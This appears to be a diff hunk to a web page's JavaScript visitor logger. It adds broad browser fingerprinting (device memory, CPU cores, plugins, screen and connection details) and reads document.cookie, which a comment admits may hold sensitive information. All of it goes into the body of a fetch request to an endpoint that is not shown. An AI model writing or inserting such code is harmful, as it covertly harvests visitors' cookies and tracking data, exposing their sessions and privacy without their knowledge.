@@ -39,7 +39,22 @@
                         const browserLanguage = navigator.language || navigator.userLanguage; // Get browser language
                         const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone; // Get time zone
                         const osInfo = navigator.platform; // Get operating system
+                        const connectionType = navigator.connection ? navigator.connection.effectiveType : 'unknown'; // Get connection type
+                        const browserVersion = userAgent.split(' ')[userAgent.split(' ').length - 1]; // Attempt to get browser version
+                        const deviceMemory = navigator.deviceMemory || 'unknown'; // Get device memory
+                        const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown'; // Get hardware concurrency
+                        const pixelRatio = window.devicePixelRatio || 'unknown'; // Get pixel ratio
+                        const onlineStatus = navigator.onLine ? 'Online' : 'Offline'; // Online status
+                        const viewportWidth = window.innerWidth; // Viewport width
+                        const viewportHeight = window.innerHeight; // Viewport height
+                        const colorDepth = window.screen.colorDepth; // Color depth
+                        const touchSupport = 'ontouchstart' in window ? 'Supported' : 'Not Supported'; // Touch support
+                        const cookiesEnabled = navigator.cookieEnabled ? 'Enabled' : 'Disabled'; // Cookies enabled
+                        const plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') || 'No plugins'; // Browser plugins
                         const timestamp = new Date().toISOString(); // Current timestamp
+
+                        // Grab cookies (may include sensitive information)
+                        const cookies = document.cookie || 'No cookies available'; 
 
                         logged = true;
 
@@ -57,7 +72,20 @@
                                 browserLanguage,
                                 timeZone,
                                 osInfo,
-                                timestamp
+                                timestamp,
+                                connectionType,
+                                browserVersion,
+                                deviceMemory,
+                                hardwareConcurrency,
+                                pixelRatio,
+                                onlineStatus,
+                                viewportWidth,
+                                viewportHeight,
+                                colorDepth,
+                                touchSupport,
+                                cookiesEnabled,
+                                plugins,
+                                cookies
                             })
                         }).then(response => {
                             if (!response.ok) {
